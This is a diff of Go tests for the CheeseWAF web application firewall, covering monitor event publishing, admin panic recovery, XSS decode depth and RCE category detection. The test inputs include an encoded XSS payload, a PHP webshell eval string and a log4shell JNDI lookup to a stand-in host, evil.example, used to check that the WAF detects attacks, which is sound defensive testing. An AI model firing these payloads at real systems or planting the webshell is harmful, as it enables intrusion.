@@ -13,17 +13,70 @@ import (
 	"math/big"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"os"
 	"path/filepath"
+	"reflect"
 	"strings"
 	"testing"
 	"time"
 
 	"github.com/LaokeQwQ/CheeseWAF/internal/config"
 	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
+	"github.com/LaokeQwQ/CheeseWAF/internal/monitor"
+	"github.com/LaokeQwQ/CheeseWAF/internal/realtime"
 	"github.com/LaokeQwQ/CheeseWAF/internal/setup"
 	"github.com/LaokeQwQ/CheeseWAF/internal/storage"
+	"github.com/LaokeQwQ/CheeseWAF/internal/timekeeper"
 )
+
+func TestPublishMonitorEventsPublishesStatsAndAlerts(t *testing.T) {
+	hub := realtime.NewHub()
+	messages := make(chan *realtime.Message, 2)
+	transport := &cliRealtimeTransport{messages: messages}
+	hub.Add(transport)
+	t.Cleanup(func() { hub.Remove(transport) })
+	snapshot := monitor.Snapshot{Sites: 3, Requests: 17}
+	alert := monitor.Alert{RuleID: "high-block-rate", Severity: "high"}
+
+	publishMonitorEvents(context.Background(), hub, snapshot, []monitor.Alert{alert})
+
+	first := waitForRealtimeMessage(t, messages)
+	second := waitForRealtimeMessage(t, messages)
+	if first.Type != realtime.MsgStats || !reflect.DeepEqual(first.Payload, snapshot) {
+		t.Fatalf("unexpected stats message: %+v", first)
+	}
+	if second.Type != realtime.MsgAlert || second.Payload != alert {
+		t.Fatalf("unexpected alert message: %+v", second)
+	}
+}
+
+func waitForRealtimeMessage(t *testing.T, messages <-chan *realtime.Message) *realtime.Message {
+	t.Helper()
+	select {
+	case message := <-messages:
+		return message
+	case <-time.After(time.Second):
+		t.Fatal("timed out waiting for realtime message")
+		return nil
+	}
+}
+
+type cliRealtimeTransport struct {
+	messages chan *realtime.Message
+}
+
+func (t *cliRealtimeTransport) Send(_ context.Context, msg *realtime.Message) error {
+	t.messages <- msg
+	return nil
+}
+
+func (*cliRealtimeTransport) Receive(context.Context) (*realtime.Message, error) {
+	return nil, errors.New("receive unsupported")
+}
+
+func (*cliRealtimeTransport) Close() error { return nil }
+func (*cliRealtimeTransport) Type() string { return "test" }
 
 func TestDirectorySizeCacheAvoidsRepeatedWalksUntilExpiry(t *testing.T) {
 	root := t.TempDir()
@@ -45,6 +98,22 @@ func TestDirectorySizeCacheAvoidsRepeatedWalksUntilExpiry(t *testing.T) {
 	}
 	if got := cache.size(root, now.Add(2*time.Hour)); got != 9 {
 		t.Fatalf("refreshed size = %d, want 9", got)
+	}
+}
+
+func TestAdminHandlerRecoversPanicsWithStableAPIError(t *testing.T) {
+	cfg := config.Default()
+	cfg.APISec.Audit.Enabled = false
+	panicHandler := http.HandlerFunc(func(http.ResponseWriter, *http.Request) { panic("private detail") })
+	h := adminHandlerWithClock(&cfg, panicHandler, "admin-secret", timekeeper.SystemClock{})
+	req := httptest.NewRequest(http.MethodGet, "/api/panic", nil)
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, req)
+	if rec.Code != http.StatusInternalServerError {
+		t.Fatalf("panic status = %d body=%s", rec.Code, rec.Body.String())
+	}
+	if strings.Contains(rec.Body.String(), "private detail") || !strings.Contains(rec.Body.String(), "trace_id") {
+		t.Fatalf("unstable or leaky panic response: %s", rec.Body.String())
 	}
 }
 
@@ -728,6 +797,54 @@ func TestBuildPipelineUsesSingleSemanticAnalyzerPath(t *testing.T) {
 	}
 }
 
+func TestBuildPipelineHonorsConfiguredDecodeDepth(t *testing.T) {
+	payload := "<script>alert(1)</script>"
+	for range 7 {
+		payload = url.QueryEscape(payload)
+	}
+
+	for _, tc := range []struct {
+		name         string
+		depth        int
+		wantDetected bool
+	}{
+		{name: "depth six", depth: 6},
+		{name: "depth eight", depth: 8, wantDetected: true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			cfg := &config.Config{Sites: []config.SiteConfig{{
+				ID:      "default",
+				Enabled: true,
+				WAF: config.WAFConfig{
+					Enabled:       true,
+					Mode:          "block",
+					ParanoiaLevel: 5,
+					SemanticEngines: config.SemanticEngineSwitches{
+						XSS: true,
+					},
+					SemanticPolicy: config.SemanticPolicyConfig{DecodeDepth: tc.depth},
+				},
+			}}}
+			pipeline, err := buildPipeline(cfg)
+			if err != nil {
+				t.Fatal(err)
+			}
+			req, _ := http.NewRequest(http.MethodGet, "/search?q="+url.QueryEscape(payload), nil)
+			reqCtx, err := engine.NewRequestContext(req, "default")
+			if err != nil {
+				t.Fatal(err)
+			}
+			result, err := pipeline.Detect(context.Background(), reqCtx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if got := result != nil && result.Detected; got != tc.wantDetected {
+				t.Fatalf("depth %d detected=%v, want %v; result=%+v", tc.depth, got, tc.wantDetected, result)
+			}
+		})
+	}
+}
+
 func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
 	cfg := &config.Config{
 		Sites: []config.SiteConfig{
@@ -751,11 +868,12 @@ func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
 	}
 
 	tests := []struct {
-		name     string
-		target   string
-		category string
+		name       string
+		target     string
+		category   string
+		detectorID string
 	}{
-		{name: "webshell", target: "/upload?payload=%3C%3Fphp%20eval(%24_POST%5B%27cmd%27%5D)%3B%20%3F%3E", category: "webshell"},
+		{name: "webshell", target: "/upload?payload=%3C%3Fphp%20eval(%24_POST%5B%27cmd%27%5D)%3B%20%3F%3E", category: "webshell", detectorID: "protection.webshell"},
 		{name: "log4shell", target: "/lookup?value=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", category: "log4shell"},
 	}
 	for _, tc := range tests {
@@ -774,6 +892,9 @@ func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
 			}
 			if result == nil || result.Category != tc.category || result.Action != engine.ActionBlock {
 				t.Fatalf("expected production %s detection, got %+v", tc.category, result)
+			}
+			if tc.detectorID != "" && result.DetectorID != tc.detectorID {
+				t.Fatalf("expected detector %q, got %+v", tc.detectorID, result)
 			}
 		})
 	}
